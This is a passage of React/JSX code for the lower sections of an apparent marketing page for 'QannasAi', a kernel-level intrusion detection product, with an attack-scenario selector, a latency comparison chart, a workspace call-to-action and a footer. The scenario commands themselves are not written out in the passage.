          <div className="cq-vector-chips-board" style={{ justifyContent: 'center' }}>
            {SCENARIOS.map((sc) => (
              <button
                key={sc.id}
                onClick={() => setSelectedScenario(sc)}
                className={`cq-chip-btn ${selectedScenario.id === sc.id ? 'active' : ''}`}
              >
                <span className="gl-tile-diamond" />
                <span>{sc.mitre} · {sc.name}</span>
                <span style={{ fontSize: '9px', padding: '1px 5px', borderRadius: '4px', background: sc.verdict === 'AUTHORIZED' ? 'rgba(45, 212, 191, 0.15)' : 'rgba(244, 63, 94, 0.15)', color: sc.verdict === 'AUTHORIZED' ? 'var(--cq-mint)' : 'var(--cq-ruby)' }}>
                  {sc.latency}
                </span>
              </button>
            ))}
          </div>

          {/* Live Interception Screen */}
          <div className="gl-cockpit-inspector" style={{ maxWidth: '980px', margin: '0 auto' }}>
            <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', borderBottom: '1px solid rgba(255, 255, 255, 0.08)', paddingBottom: '18px', marginBottom: '20px', flexWrap: 'wrap', gap: '14px' }}>
              <div>
                <div style={{ fontFamily: 'var(--cq-font-mono)', fontSize: '11px', color: 'var(--cq-titanium)', marginBottom: '4px' }}>
                  TARGET: #{selectedScenario.id} · MITRE {selectedScenario.mitre} · {selectedScenario.route}
                </div>
                <h3 style={{ fontSize: '20px', fontWeight: 800, color: '#ffffff', margin: 0 }}>
                  {selectedScenario.name}
                </h3>
              </div>

              <div style={{ display: 'flex', alignItems: 'center', gap: '14px' }}>
                <span style={{ fontFamily: 'var(--cq-font-mono)', fontSize: '18px', fontWeight: 800, color: 'var(--cq-amber)' }}>
                  {selectedScenario.latency === '0ms' ? 'BASELINE' : `< ${selectedScenario.latency}`}
                </span>

                <button 
                  onClick={runSimulation}
                  className={`cq-sim-btn ${isSimulating ? 'simulating' : ''}`}
                  disabled={isSimulating}
                >
                  <Zap className="w-3.5 h-3.5" />
                  <span>{isSimulating ? 'DROPPING SOCKET...' : 'SIMULATE INTERCEPT'}</span>
                </button>
              </div>
            </div>

            {/* Dynamic Command & Kernel Action */}
            <div className="cq-telemetry-grid-2" style={{ marginBottom: 0 }}>
              <div className="cq-screen-card">
                <span className="cq-screen-lbl">SHELL PAYLOAD</span>
                <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', gap: '8px' }}>
                  <code style={{ fontFamily: 'var(--cq-font-mono)', fontSize: '12px', color: '#ffffff' }}>
                    {selectedScenario.command}
                  </code>
                  <button 
                    onClick={() => copyCommand(selectedScenario.id, selectedScenario.command)}
                    style={{ background: 'transparent', border: 'none', cursor: 'pointer', color: 'var(--cq-titanium)' }}
                  >
                    {copiedId === selectedScenario.id ? <Check className="w-3.5 h-3.5 text-emerald-400" /> : <Copy className="w-3.5 h-3.5" />}
                  </button>
                </div>
              </div>

              <div className="cq-screen-card">
                <span className="cq-screen-lbl">NETFILTER KERNEL ACTION</span>
                <code style={{ fontFamily: 'var(--cq-font-mono)', fontSize: '12px', color: 'var(--cq-mint)' }}>
                  {selectedScenario.kernelAction}
                </code>
              </div>
            </div>

          </div>

        </div>
      </section>

      {/* ── DELINEATION DASHED LINE ── */}
      <div className="gl-dash-line-h">
        <div className="gl-dash-diamond left" />
        <div className="gl-dash-diamond center" />
        <div className="gl-dash-diamond right" />
      </div>

      {/* ── SECTION 07: VISUAL LATENCY SPEEDOMETER (`#latency`) ── */}
      <section id="latency" className="cq-section" style={{ padding: '80px 0' }}>
        <div className="cq-container">
          
          <div className="cq-section-header" style={{ marginBottom: '30px' }}>
            <div className="cq-section-pill">
              <span className="gl-tile-diamond" />
              <span>Speed Benchmark</span>
            </div>
            <h2 className="cq-section-title">
              20x Faster Wire Containment
            </h2>
            <p className="cq-section-desc">
              Visual containment latency comparison against legacy user-space security solutions.
            </p>
          </div>

          <div style={{ maxWidth: '860px', margin: '0 auto' }}>
            <div className="cq-speed-comparison-deck">
              
              {/* Row 1: Legacy Firewall */}
              <div className="cq-speed-row">
                <div className="cq-speed-meta">
                  <span style={{ color: 'var(--cq-text-muted)' }}>Legacy Next-Gen Firewall (User-Space Queue)</span>
                  <span style={{ color: '#ef4444', fontWeight: 700 }}>850ms</span>
                </div>
                <div className="cq-speed-bar-track">
                  <div className="cq-speed-bar-fill legacy" />
                </div>
              </div>

              {/* Row 2: User-Space EDR */}
              <div className="cq-speed-row">
                <div className="cq-speed-meta">
                  <span style={{ color: 'var(--cq-text-muted)' }}>User-Space EDR Agent Daemon</span>
                  <span style={{ color: '#f59e0b', fontWeight: 700 }}>320ms</span>
                </div>
                <div className="cq-speed-bar-track">
                  <div className="cq-speed-bar-fill edr" />
                </div>
              </div>

              {/* Row 3: QannasAi Core */}
              <div className="cq-speed-row">
                <div className="cq-speed-meta">
                  <span style={{ color: '#ffffff', fontWeight: 700 }}>QannasAi Core (Netfilter Hook Priority 0)</span>
                  <span style={{ color: 'var(--cq-mint)', fontWeight: 800 }}>&lt; 38.4ms (Deterministic)</span>
                </div>
                <div className="cq-speed-bar-track">
                  <div className="cq-speed-bar-fill qannas" />
                </div>
              </div>

            </div>
          </div>

        </div>
      </section>

      {/* ── DELINEATION DASHED LINE ── */}
      <div className="gl-dash-line-h">
        <div className="gl-dash-diamond left" />
        <div className="gl-dash-diamond center" />
        <div className="gl-dash-diamond right" />
      </div>

      {/* ── SECTION 08: ENTER THE WORKSPACE (GRAND PORTAL) (`#workspace`) ── */}
      <section id="workspace" className="cq-workspace-section">
        <div className="cq-container">
          
          <div className="cq-workspace-gateway-card">
            
            {/* Live Operational Status Strip */}
            <div className="cq-workspace-status-deck">
              <span className="cq-ws-status-chip active">
                <span className="gl-tile-diamond" style={{ background: 'var(--cq-mint)' }} />
                <span>Autonomous Core Active</span>
              </span>
              <span className="cq-ws-status-chip">
                <span>Netfilter Priority 0 Armed</span>
              </span>
              <span className="cq-ws-status-chip">
                <span>Wire SLA: &lt; 38.4ms</span>
              </span>
            </div>

            <h2 className="cq-workspace-title">
              Enter the Workspace
            </h2>

            <p className="cq-workspace-desc">
              Launch the live zero-trust operations center. Inspect real-time network topology, observe the agent reasoning loop, and audit active in-kernel isolation.
            </p>

            <div className="cq-workspace-actions-group">
              <Link to="/" className="cq-workspace-primary-btn">
                <span>Launch Operations Center</span>
                <ArrowRight className="w-5 h-5 ml-1" />
              </Link>

              <Link to="/" className="cq-workspace-secondary-btn">
                <Activity className="w-4 h-4 text-emerald-400" />
                <span>View Live Topology</span>
              </Link>
            </div>

            {/* Terminal Preview */}
            <div className="cq-workspace-terminal-preview">
              <div style={{ color: 'var(--cq-titanium)', marginBottom: '4px' }}>
                # Attach live operator console to QannasAi kernel enclave:
              </div>
              <div>
                $ <span style={{ color: '#ffffff' }}>qannas-cli workspace attach --enclave=core-01</span>
              </div>
              <div style={{ color: 'var(--cq-mint)', marginTop: '4px' }}>
                [OK] Connected to Netfilter Priority 0 Hook // Ready for Operations
              </div>
            </div>

          </div>

        </div>
      </section>

      {/* ── FOOTER ── */}
      <footer className="cq-footer">
        <div className="cq-container">
          <div className="cq-footer-inner">
            
            <div className="cq-footer-col-brand">
              <div className="cq-brand">
                <div className="cq-brand-logo">
                  <Shield className="w-4 h-4 text-emerald-400" />
                </div>
                <div className="cq-brand-info">
                  <span className="cq-brand-name">QANNASAI</span>
                  <span className="cq-brand-badge">CORE 2.4</span>
                </div>
              </div>
              <p className="cq-footer-tagline">
                Autonomous zero-trust intrusion detection and deterministic kernel enforcement.
              </p>
              <div className="cq-footer-status">
                <span className="cq-status-dot" />
                <span>ALL SYSTEMS OPERATIONAL // DETERMINISTIC KERNEL ACTIVE</span>
              </div>
            </div>

            <div className="cq-footer-links-col">
              <h5>NAVIGATION</h5>
              <ul>
                <li><a href="#hero">Overview</a></li>
                <li><a href="#why-us">Why Us</a></li>
                <li><a href="#comparison">Benchmark</a></li>
                <li><a href="#pipeline">Pipeline</a></li>
                <li><a href="#uae-council">UAE Council</a></li>
                <li><a href="#matrix">Vector Matrix</a></li>
                <li><a href="#workspace">Workspace</a></li>
              </ul>
            </div>

            <div className="cq-footer-links-col">
              <h5>OPERATIONS</h5>
              <ul>
                <li><Link to="/">Operations Center</Link></li>
                <li><Link to="/">Topology Visualizer</Link></li>
                <li><Link to="/">Agent Reasoning Loop</Link></li>
                <li><Link to="/">Kernel Firewall State</Link></li>
              </ul>
            </div>

          </div>

          <div className="cq-footer-bottom">
            <span>© {new Date().getFullYear()} QannasAi Defense Systems. All rights reserved.</span>
            <span>Sub-42ms Deterministic Kernel Isolation</span>
          </div>
        </div>
      </footer>
    </div>
  );
}
